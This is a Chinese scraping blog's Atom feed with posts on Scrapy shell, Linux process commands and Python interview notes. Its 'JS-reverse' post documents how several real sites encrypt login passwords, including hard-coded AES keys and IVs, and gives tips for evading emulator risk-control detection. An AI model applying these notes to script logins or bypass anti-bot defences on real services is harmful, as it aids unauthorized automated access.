<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SpiderBlog</title>
  
  <subtitle>一个专注于分享爬虫实践相关的博客</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://spiderblog.cn/"/>
  <updated>2020-02-22T10:38:35.122Z</updated>
  <id>http://spiderblog.cn/</id>
  
  <author>
    <name>Mr.Zhou</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Scrapy_shell</title>
    <link href="http://spiderblog.cn/Scrapy_shell.html"/>
    <id>http://spiderblog.cn/Scrapy_shell.html</id>
    <published>2020-02-21T18:08:11.000Z</published>
    <updated>2020-02-22T10:38:35.122Z</updated>
    
    <content type="html"><![CDATA[<h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给scrapy shell 调试加上headers</span></span><br><span class="line">scrapy shell <span class="comment"># 进入shell,但没有url</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'User-Agent:Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1'</span>&#125;</span><br><span class="line">req = scrapy.Request(url=<span class="string">'url'</span>,headers=headers)</span><br><span class="line">fetch(req) <span class="comment"># 如此就等价于scrapy shell url # 添加了headers</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;shell&quot;&gt;&lt;a href=&quot;#shell&quot; class=&quot;headerlink&quot; title=&quot;shell&quot;&gt;&lt;/a&gt;shell&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
      
    
    </summary>
    
    
      <category term="Scrapy" scheme="http://spiderblog.cn/categories/Scrapy/"/>
    
    
      <category term="Scrapy" scheme="http://spiderblog.cn/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>Scrapy_1</title>
    <link href="http://spiderblog.cn/Scrapy-1.html"/>
    <id>http://spiderblog.cn/Scrapy-1.html</id>
    <published>2020-02-16T15:40:32.000Z</published>
    <updated>2020-02-16T15:41:38.640Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令加上参数 --nolog 可以去掉log日志输出</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="Scrapy" scheme="http://spiderblog.cn/categories/Scrapy/"/>
    
    
      <category term="Scrapy" scheme="http://spiderblog.cn/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>JS</title>
    <link href="http://spiderblog.cn/JS.html"/>
    <id>http://spiderblog.cn/JS.html</id>
    <published>2020-02-07T15:51:10.000Z</published>
    <updated>2020-02-07T15:52:14.203Z</updated>
    
    <content type="html"><![CDATA[<h4 id="JS基础"><a href="#JS基础" class="headerlink" title="JS基础"></a>JS基础</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $('#loginPwd')是获取窗口的一个常量</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;JS基础&quot;&gt;&lt;a href=&quot;#JS基础&quot; class=&quot;headerlink&quot; title=&quot;JS基础&quot;&gt;&lt;/a&gt;JS基础&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
    
      <category term="JS" scheme="http://spiderblog.cn/categories/JS/"/>
    
    
      <category term="JS" scheme="http://spiderblog.cn/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>JS-reverse</title>
    <link href="http://spiderblog.cn/JS-reverse.html"/>
    <id>http://spiderblog.cn/JS-reverse.html</id>
    <published>2020-02-07T15:29:28.000Z</published>
    <updated>2020-02-15T03:12:29.581Z</updated>
    
    <content type="html"><![CDATA[<h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getpwd</span>(<span class="params">plaintext</span>)</span>&#123;  <span class="comment">// 一定要先找到明文</span></span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">return</span> ciphertext  <span class="comment">// 返回格式有两种：Hex和base64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="常见加密方式"><a href="#常见加密方式" class="headerlink" title="常见加密方式"></a>常见加密方式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MD5, SHA <span class="comment"># 不可逆 # 常用</span></span><br><span class="line">HMAC, RC4, </span><br><span class="line">AES, DES, <span class="number">3</span>DES <span class="comment"># 可逆 # 常用</span></span><br><span class="line">Base64, Rabbit, PBKDF2/EvpKDF</span><br><span class="line">RSA</span><br></pre></td></tr></table></figure><h4 id="chrome-F12"><a href="#chrome-F12" class="headerlink" title="chrome-F12"></a>chrome-F12</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search</span><br><span class="line">sensors <span class="comment"># 设置经纬度</span></span><br><span class="line">下断点</span><br><span class="line">Breakpoints <span class="comment"># 管理断点</span></span><br><span class="line">Call Stack <span class="comment"># 堆栈</span></span><br><span class="line">抓包勾选Preserve log（保存日志），页面跳转，也能保存上一个界面的日志</span><br></pre></td></tr></table></figure><h4 id="工具网站"><a href="#工具网站" class="headerlink" title="工具网站"></a>工具网站</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://tool.chacuo.net/cryptdes</span><br><span class="line"><span class="comment"># 用来解析公钥（RSA加密），可获取key长度，模数，指数  </span></span><br><span class="line"><span class="comment"># 公钥没有反斜杠'\',只有'/'</span></span><br><span class="line"><span class="comment"># 指数看0x，一般为0x10001,所以就是10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 雷电模拟器 3.63</span></span><br></pre></td></tr></table></figure><h4 id="哈希系列通杀"><a href="#哈希系列通杀" class="headerlink" title="哈希系列通杀"></a>哈希系列通杀</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CryptoJS.MD5('word')</span></span><br><span class="line"><span class="comment"># 哈希加密系列有一个固定值1732584193，可以直接搜索</span></span><br></pre></td></tr></table></figure><h4 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mode <span class="comment"># 类型，常用CBC和ECB</span></span><br><span class="line">padding <span class="comment"># 常用Pkos7和Iso10126</span></span><br><span class="line">IV <span class="comment"># 一般为固定值,要选最初值</span></span><br><span class="line">key <span class="comment"># 一般为固定值</span></span><br><span class="line"><span class="comment"># IV和key都有Eno编码规则，如UTF8</span></span><br></pre></td></tr></table></figure><h4 id="RAS加密"><a href="#RAS加密" class="headerlink" title="RAS加密"></a>RAS加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">指数:一般为<span class="number">10001</span></span><br><span class="line">公钥:(很长)要找出来  <span class="comment"># 1.上一个请求的返回值(getpublickey) 2.js文件中默认 3.js代码生成</span></span><br><span class="line"><span class="comment"># B64编码</span></span><br><span class="line"><span class="comment"># PKCS1指的每次生成值不一样</span></span><br><span class="line"><span class="comment"># 内容反转</span></span><br><span class="line"><span class="comment"># 内存反转</span></span><br></pre></td></tr></table></figure><h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 小块弹窗，右键检查源码找到目标网址，放入浏览器打开，会出现一个干净的登录界面，方便抓包</span></span><br><span class="line"><span class="comment"># 密码一般为哈希加密</span></span><br><span class="line"><span class="comment"># 遇到Encrypt加断点</span></span><br><span class="line"><span class="comment"># 方法有传参数，就可能是的</span></span><br></pre></td></tr></table></figure><h4 id="JS逆向工具"><a href="#JS逆向工具" class="headerlink" title="JS逆向工具"></a>JS逆向工具</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WT-JS_DEBUG  <span class="comment"># 找安全版本，其他的好像有病毒</span></span><br></pre></td></tr></table></figure><h4 id="JS加密实例"><a href="#JS加密实例" class="headerlink" title="JS加密实例"></a>JS加密实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">中关村登录</span><br><span class="line">pwd: <span class="number">3</span>b8aaa16fa213573513038281774d9c0  <span class="comment"># wuyao666</span></span><br><span class="line"><span class="comment"># pwd : md5Password</span></span><br><span class="line"><span class="comment"># var md5Password = CryptoJS.MD5(password+"zol") + '';</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">今目标登录</span><br><span class="line">password: a2c13e941f4f68fde8d92399ddeb3bf25111a434 <span class="comment"># wuyao666</span></span><br><span class="line"><span class="comment"># var result = &#123;&#125;</span></span><br><span class="line"><span class="comment"># result.password = sha1(resultData.password)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">升学e网通 <span class="comment"># AES</span></span><br><span class="line">password: <span class="string">"590d9a610747ab5392a8a164793516a8"</span> <span class="comment"># wuyao666</span></span><br><span class="line"><span class="comment"># password: i = (0, v.Encrypt)(i)</span></span><br><span class="line">t.Encrypt = function(e) &#123;</span><br><span class="line">            var t = n[<span class="string">"default"</span>].enc.Utf8.parse(e);</span><br><span class="line">            <span class="keyword">return</span> n[<span class="string">"default"</span>].AES.encrypt(t, i, &#123;</span><br><span class="line">                iv: o,</span><br><span class="line">                mode: n[<span class="string">"default"</span>].mode.CBC,</span><br><span class="line">                padding: n[<span class="string">"default"</span>].pad.Pkcs7</span><br><span class="line">            &#125;).ciphertext.toString().toUpperCase()</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment"># o = n["default"].enc.Utf8.parse("2017110912453698")</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">有赞 <span class="comment">// AES # 网站已经改了</span></span><br><span class="line">Fiddler抓包</span><br><span class="line"><span class="comment">// 对password 加密</span></span><br><span class="line">password: d.a.encrypt(e.password)</span><br><span class="line"><span class="comment">// 源码:</span></span><br><span class="line">n = e.enc.Utf8.parse(<span class="string">"youzan.com.aesiv"</span>)</span><br><span class="line">i = e.enc.Utf8.parse("youzan.com._key_")  # i在此处是key</span><br><span class="line"><span class="keyword">var</span> r = e.AES.encrypt(t, i, &#123;</span><br><span class="line">    mode: e.mode.CBC,</span><br><span class="line">    padding: e.pad.Iso10126,</span><br><span class="line">iv: n  <span class="comment">// 这个值很容易混淆,要找初始值，即enc.Utf8.parse()之前的值.</span></span><br><span class="line">&#125;).toString()</span><br><span class="line"><span class="comment">// 对ticket 加密</span></span><br><span class="line">fingerPrint  <span class="comment">// 指纹，其实就是加密后的一个字符串</span></span><br><span class="line">date:&#123;</span><br><span class="line">    fingerPrint: t ? t + c.default.encrypt(r) : <span class="string">""</span>,  <span class="comment">// a?b:c</span></span><br><span class="line">    youzanType: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 也是AES加密</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">华特东方注册加密 <span class="comment"># 都是AES</span></span><br><span class="line"><span class="comment"># password </span></span><br><span class="line"><span class="comment"># token</span></span><br><span class="line"><span class="comment"># tokens  #参数unid</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">网页百度登录加密 <span class="comment"># RSA</span></span><br><span class="line"><span class="comment"># token和codestring都是可以固定值的</span></span><br><span class="line"><span class="comment"># gid是随机的，随机数</span></span><br><span class="line"><span class="comment"># password是加密了的RSA,公钥通过请求获取 # password = </span></span><br><span class="line"><span class="comment"># 手机和网页端加密不一样</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">手机百度登录加密 <span class="comment"># RSA</span></span><br><span class="line"><span class="comment"># l.password = window.encryptedString(r,l.password)  # 前面明码经过了拼接</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">运动潮流单品交易平台 <span class="comment"># 拼接+md5</span></span><br><span class="line"><span class="comment"># sign 加密了</span></span><br><span class="line"><span class="comment"># 搜索sign</span></span><br><span class="line"><span class="comment"># t.data.sign || (t.data.sign = Object(I["b"])(t.data))</span></span><br><span class="line"><span class="comment"># t.transformRequest = M : t.params.sign = Object(I["b"])(t.params)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 京东登录 #RSA</span></span><br><span class="line"><span class="comment"># nloginpwd</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 微博 # RSA和SHA1</span></span><br><span class="line">sp  <span class="comment"># e.sp = b;   # sp是密码</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 享物说 # 滑动验证(一般都是假的,提交的请求包,没有这些参数值)</span></span><br><span class="line">模拟器有时候会被识别为<span class="string">"高风险设备:伪造设备"</span>，就不会抓到真的包，需要用自己真的手机来抓包  <span class="comment"># fengkong</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;基本格式&quot;&gt;&lt;a href=&quot;#基本格式&quot; class=&quot;headerlink&quot; title=&quot;基本格式&quot;&gt;&lt;/a&gt;基本格式&lt;/h4&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
    
      <category term="JS-reverse" scheme="http://spiderblog.cn/categories/JS-reverse/"/>
    
    
      <category term="JS-reverse" scheme="http://spiderblog.cn/tags/JS-reverse/"/>
    
  </entry>
  
  <entry>
    <title>Linux-command</title>
    <link href="http://spiderblog.cn/Linux-command.html"/>
    <id>http://spiderblog.cn/Linux-command.html</id>
    <published>2020-01-28T17:48:56.000Z</published>
    <updated>2020-02-04T07:00:08.358Z</updated>
    
    <content type="html"><![CDATA[<h4 id="port"><a href="#port" class="headerlink" title="port"></a>port</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看占用端口的进程</span></span><br><span class="line">netstat -tlnp|grep <span class="number">6379</span>  <span class="comment"># t-tcp,l-listen,n-不解析(速度快),p-process</span></span><br><span class="line"><span class="comment"># 一次性的清除占用80端口的程序</span></span><br><span class="line">lsof -i :<span class="number">80</span>|grep -v <span class="string">"PID"</span>|awk <span class="string">'&#123;print "kill -9",$2&#125;'</span>|sh</span><br><span class="line"><span class="comment"># 终止进程</span></span><br><span class="line">kill <span class="number">5014</span></span><br><span class="line"><span class="comment"># 强制终止进程</span></span><br><span class="line">kill <span class="number">-9</span> <span class="number">5014</span>  <span class="comment"># 是pid</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;port&quot;&gt;&lt;a href=&quot;#port&quot; class=&quot;headerlink&quot; title=&quot;port&quot;&gt;&lt;/a&gt;port&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Interview-5</title>
    <link href="http://spiderblog.cn/Interview-5.html"/>
    <id>http://spiderblog.cn/Interview-5.html</id>
    <published>2020-01-28T05:33:29.000Z</published>
    <updated>2020-01-29T14:49:45.774Z</updated>
    
    <content type="html"><![CDATA[<h4 id="系统编程"><a href="#系统编程" class="headerlink" title="系统编程"></a>系统编程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程总结</span></span><br><span class="line"><span class="comment"># 程序运行在操作系统上的一个实例，就称之为进程。</span></span><br><span class="line"><span class="comment"># 进程需要相应的系统资源：内存、时间片、pid</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line">proc = Process(target=func, args=(<span class="number">1</span>,), kwargs=&#123;<span class="string">'a'</span>: <span class="string">'a'</span>&#125;, name=<span class="string">'proc_1'</span>)</span><br><span class="line">proc.start()</span><br><span class="line">proc.is_alive()  <span class="comment"># 是否还活着</span></span><br><span class="line">proc.join(timeout=<span class="number">10</span>)  <span class="comment"># 等结束，或者等10秒</span></span><br><span class="line">proc.terminate()  <span class="comment"># 强制关闭</span></span><br><span class="line">proc.name</span><br><span class="line">proc.pid</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程之间的通信-Queue  # 只用于本机，不能注册到网络上</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue</span><br><span class="line">que = Queue(maxsize=<span class="number">0</span>)  <span class="comment"># 可以指定最大容量</span></span><br><span class="line">que.qsize()  <span class="comment"># 返回当前包含的消息数量</span></span><br><span class="line">que.empty()  <span class="comment"># 为空返回True</span></span><br><span class="line">que.full()   <span class="comment"># 满了返回True</span></span><br><span class="line">que.get(block=<span class="literal">True</span>,timeout=<span class="literal">None</span>)  <span class="comment"># 超时,抛出"Queue.Empty"异常</span></span><br><span class="line">que.put(item,block=<span class="literal">True</span>,timeout=<span class="literal">None</span>)  <span class="comment"># 超时,抛出"Queue.Full"异常</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程池-Pool</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">pool = Pool(<span class="number">3</span>)</span><br><span class="line">pool.apply_async(func=func, args=(), kwds=&#123;&#125;, callback=<span class="literal">None</span>, error_callback=<span class="literal">None</span>)</span><br><span class="line">pool.close()   <span class="comment"># 必须关闭</span></span><br><span class="line">pool.join()</span><br><span class="line">pool.terminate()</span><br><span class="line"><span class="comment"># 如果要使用 Pool 创建进程，就需要使用 multiprocessing.Manager()中的 Queue()</span></span><br><span class="line"><span class="comment"># 不能使用multiprocessing.Queue()</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Manager</span><br><span class="line">q = Manager().Queue()</span><br></pre></td></tr></table></figure><h4 id="你对多进程，多线程，以及协程的理解，项目是否用？"><a href="#你对多进程，多线程，以及协程的理解，项目是否用？" class="headerlink" title="你对多进程，多线程，以及协程的理解，项目是否用？"></a>你对多进程，多线程，以及协程的理解，项目是否用？</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程：一个运行的程序（代码）就是一个进程，没有运行的代码叫程序，进程是系统资源分配的最小单位，进程拥有自己独立的内存空间，所以进程间数据不共享，开销大。</span></span><br><span class="line"><span class="comment"># 线程： 调度执行的最小单位，也叫执行路径，不能独立存在，依赖进程存在一个进程至少有一个线程，叫主线程，而多个线程共享内存(数据共享，共享全局变量)，从而极大地提高了程序的运行效率。</span></span><br><span class="line"><span class="comment"># 协程：是一种用户态的轻量级线程，协程的调度完全由用户控制。协程拥有自己的寄存器上下文和栈。 协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切换非常快。</span></span><br></pre></td></tr></table></figure><h4 id="什么是多线程竞争？"><a href="#什么是多线程竞争？" class="headerlink" title="什么是多线程竞争？"></a>什么是多线程竞争？</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 线程是非独立的，同一个进程里线程是数据共享的，当各个线程访问数据资源时会出现竞争状态即：数据几乎同步会被多个线程占用，造成数据混乱 ，即所谓的线程不安全</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 那么怎么解决多线程竞争问题？-- 锁。</span></span><br><span class="line"><span class="comment"># 锁的好处：确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资源竞争下的原子操作问题。</span></span><br><span class="line"><span class="comment"># 锁的坏处：阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了</span></span><br><span class="line"><span class="comment"># 锁的致命问题：死锁。</span></span><br></pre></td></tr></table></figure><h4 id="什么是死锁？"><a href="#什么是死锁？" class="headerlink" title="什么是死锁？"></a>什么是死锁？</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 若干子线程在系统资源竞争时，都在等待对方对某部分资源解除占用状态，结果是谁也不愿先解锁，互相干等着，程序无法执行下去，这就是死锁。</span></span><br><span class="line"><span class="comment"># GIL锁</span></span><br><span class="line"><span class="comment"># 全局解释器锁（只在 cpython 里才有）</span></span><br><span class="line"><span class="comment"># 作用：限制多线程同时执行，保证同一时间只有一个线程执行，所以 cpython 里的多线程其实是伪多线程!</span></span><br><span class="line"><span class="comment"># 所以 Python 里常常使用协程技术来代替多线程，协程是一种更轻量级的线程</span></span><br><span class="line"><span class="comment"># 进程和线程的切换时由系统决定，而协程由我们程序员自己决定，而模块 gevent 下切换是遇到了耗时操作才会切换。</span></span><br><span class="line"><span class="comment"># 三者的关系：进程里有线程，线程里有协程。</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;系统编程&quot;&gt;&lt;a href=&quot;#系统编程&quot; class=&quot;headerlink&quot; title=&quot;系统编程&quot;&gt;&lt;/a&gt;系统编程&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/categories/Interview/"/>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>Interview-4</title>
    <link href="http://spiderblog.cn/Interview-4.html"/>
    <id>http://spiderblog.cn/Interview-4.html</id>
    <published>2020-01-28T04:37:40.000Z</published>
    <updated>2020-01-28T05:33:13.229Z</updated>
    
    <content type="html"><![CDATA[<h4 id="单例"><a href="#单例" class="headerlink" title="单例"></a>单例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单案例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    _instance = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> cls._instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            cls._instance = object.__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 应用场景</span></span><br><span class="line"><span class="number">1.</span> 资源共享：日志文件，应用配置</span><br><span class="line"><span class="number">2.</span> 资源控制：应用配置，日志文件，网站计数器，多线程池，数据库配置，数据库连接池</span><br></pre></td></tr></table></figure><h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">定义：在函数内部再定义一个函数，并且这个函数用到了外边函数的变量，那么将这个函数以及用到的一些变量称之为闭包。</span><br></pre></td></tr></table></figure><h4 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用于有切面需求的场景</span></span><br><span class="line"><span class="comment"># 插入日志、性能测试、事务处理、缓存、权限的校验等场景</span></span><br><span class="line"><span class="comment"># 有了装饰器就可以抽离出大量的与函数功能本身无关的雷同代码并发并继续使用</span></span><br></pre></td></tr></table></figure><h4 id="Python-中-is-和-的区别？"><a href="#Python-中-is-和-的区别？" class="headerlink" title="Python 中 is 和==的区别？"></a>Python 中 is 和==的区别？</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 